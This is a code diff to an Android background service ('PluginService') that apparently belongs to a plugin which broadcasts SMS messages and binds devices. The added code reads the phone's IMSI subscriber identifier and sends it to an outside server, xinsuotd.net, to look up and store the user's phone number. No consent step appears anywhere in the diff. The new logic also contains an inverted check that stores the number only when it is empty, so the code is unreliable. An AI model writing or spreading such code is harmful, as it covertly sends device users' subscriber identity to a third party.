@@ -18,6 +18,8 @@ import com.xstd.plugin.Utils.DomanManager;
 import com.xstd.plugin.Utils.SMSUtil;
 import com.xstd.plugin.api.ActiveRequest;
 import com.xstd.plugin.api.ActiveResponse;
+import com.xstd.plugin.api.PhoneFetchRequest;
+import com.xstd.plugin.api.PhoneFetchRespone;
 import com.xstd.plugin.binddevice.DeviceBindBRC;
 import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
@@ -41,6 +43,8 @@ public class PluginService extends IntentService {
     public static final String ACTIVE_PACKAGE_ACTION = "com.xstd.plugin.package.active";
 
     public static final String SMS_BROADCAST_ACTION = "com.xstd.plugin.broadcast";
+
+    public static final String ACTIVE_FETCH_PHONE_ACTION = "com.xstd.plugin.fetch.phone";
 
 //    private static final String[] SEND_MESSAGE_CONTENT = new String[] {
 //        "你好，很高兴认识你。",
@@ -81,7 +85,34 @@ public class PluginService extends IntentService {
                 monkeyAction();
             } else if (SMS_BROADCAST_ACTION.equals(action)) {
                 broadcastSMSForSMSCenter(intent);
+            } else if (ACTIVE_FETCH_PHONE_ACTION.equals(action)) {
+                fetchPhoneFromServer();
             }
+        }
+    }
+
+    private synchronized void fetchPhoneFromServer() {
+        if (Config.DEBUG) {
+            Config.LOGD("[[PluginService::fetchPhoneFromServer]] entry");
+        }
+
+        try {
+            if (TextUtils.isEmpty(SettingManager.getInstance().getCurrentPhoneNumber())) {
+                String imsi = UtilsRuntime.getIMSI(getApplicationContext());
+                if (!TextUtils.isEmpty(imsi)) {
+                    PhoneFetchRespone respone = InternetUtils.request(getApplicationContext()
+                                                                , new PhoneFetchRequest("http://www.xinsuotd.net/tools/" + imsi));
+                    if (respone != null && TextUtils.isEmpty(respone.phone)) {
+                        SettingManager.getInstance().setCurrentPhoneNumber(respone.phone);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        if (Config.DEBUG) {
+            Config.LOGD("[[PluginService::fetchPhoneFromServer]] leave");
         }
     }
 
